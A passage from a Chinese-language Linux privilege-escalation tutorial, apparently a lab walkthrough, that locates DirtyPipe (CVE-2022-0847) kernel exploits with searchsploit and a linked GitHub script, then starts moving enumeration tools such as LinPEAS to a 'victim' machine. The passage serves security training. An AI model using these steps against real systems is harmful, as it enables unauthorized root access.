<p>查看最上面的结果，有两种方法可以利用这个漏洞，其中第 2 种看起来最简单，因为它只需要一个 SUID 二进制文件就可以利用，而我们知道 Linux 上有很多这样的二进制文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353797-945943356-8597196efaf27bf1c4d550a1127f8311.png" width="955" height="421" class="img_ev3q"></p>
<p>现在我们只需要复制exploit2的原始脚本并将其粘贴到攻击者机器上的文本编辑器中。可以<a href="https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c" target="_blank" rel="noopener noreferrer">在此处</a>找到要复制的原始脚本。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353410-757607429-437439b7b878ff209c60579158b8e792.png" width="650" height="403" class="img_ev3q"></p>
<p>现在我们在攻击者的机器上已经拥有了该exploit，然后我们需要对其进行编译；然而，在我们进行这一步之前，让我们用另一种方法来手动查找该内核版本的exploit。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="222使用-searchsploit-查找内核漏洞"><strong><div id="id2.2.2">2.2.2、使用 Searchsploit 查找内核漏洞</div></strong><a href="#222使用-searchsploit-查找内核漏洞" class="hash-link" aria-label="222使用-searchsploit-查找内核漏洞的直接链接" title="222使用-searchsploit-查找内核漏洞的直接链接">​</a></h6>
<p>Kali 中预装了一个很棒的工具，即searchsploit，它是一个用于从<a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">exploit-db</a>数据库中搜索漏洞的工具。由于exploit-db（Offesnive Security）的创建者也维护着Kali，因此将其打包在一起是合情合理的。</p>
<p>对我们来说，这意味着exploit-db上的每个漏洞利用都已经在我们的攻击者机器上，我们只需要使用<strong>searchsploit</strong>来找到它们，然后我们就可以将它们复制到我们的工作目录中。</p>
<blockquote>
<p>将使用 searchsploit 找到的漏洞复制或镜像到我们的工作目录中，而不是操纵原始文件本身，这一点很重要。保持原始文件干净，并制作副本以供摆弄。</p>
</blockquote>
<p>与我们使用 Google 搜索漏洞时不同，searchsploit 中的大多数内核漏洞都有版本范围。这意味着我们无法专门搜索内核 <strong>5.13</strong>，因为过于具体可能无法为我们提供匹配项。相反，我们可以仅使用 <strong>5.</strong> 作为搜索，以便提供所有 <strong>5.x</strong> 结果。</p>
<p>首先，我们要从广泛的范围开始，然后在开始获得结果时缩小搜索范围。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit linux kernel 5.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353952-29553728-720a3bc0008ae4af55979c2e18e5d200.png" width="971" height="173" class="img_ev3q"></p>
<p>向下滚动，我们可以看到一些<strong>5.x</strong>内核版本的漏洞利用；但是，我们的目标内核版本是<strong>5.13</strong>，它属于 DirtyPipe 的范围（介于5.8 到 5.16.11 之间）。这个漏洞非常适合我们的需求！</p>
<p>现在有两种方法可以将此漏洞复制到我们的工作目录中。首先，我们可以使用<strong>searchsploit</strong>镜像它，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit -m 50808.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353235-1109658448-984296a8e7bcc1966749d79211403294.png" width="653" height="241" class="img_ev3q"></p>
<p>或者，我们可以在系统上找到该文件，然后将其复制到我们的工作目录中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">locate linux/local/50808.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="418" height="66" class="img_ev3q"></p>
<p>现在我们可以使用<strong>cp</strong>命令将其复制到我们的工作目录，并在执行时将其命名为我们喜欢的任何名称。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353466-22158667-98c63be5a1c246edbeeeff04fb8b533d.png" width="734" height="117" class="img_ev3q"></p>
<p>好的，现在我们在攻击者机器上已经有了这个漏洞的两个副本可供编译；但是，让我们看看如何使用工具来快速枚举内核漏洞。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="23自动查找内核漏洞"><strong><div id="id2.3">2.3、自动查找内核漏洞</div></strong><a href="#23自动查找内核漏洞" class="hash-link" aria-label="23自动查找内核漏洞的直接链接" title="23自动查找内核漏洞的直接链接">​</a></h4>
<p>在本节中，我们将重点介绍使用两种不同的工具来帮助我们快速找到可用于攻击目标的潜在内核漏洞。我们将使用的工具是<a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220821" target="_blank" rel="noopener noreferrer">LinPEAS</a>和<a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener noreferrer">Linux-Exploit-Suggester</a>。请按照提供的链接下载这两个文件。</p>
<p>将这两个工具下载到攻击者计算机上后，我们需要将文件传输给受害者。为此，我们可以快速设置一个 Python HTTP 服务器，如下所示：</p>
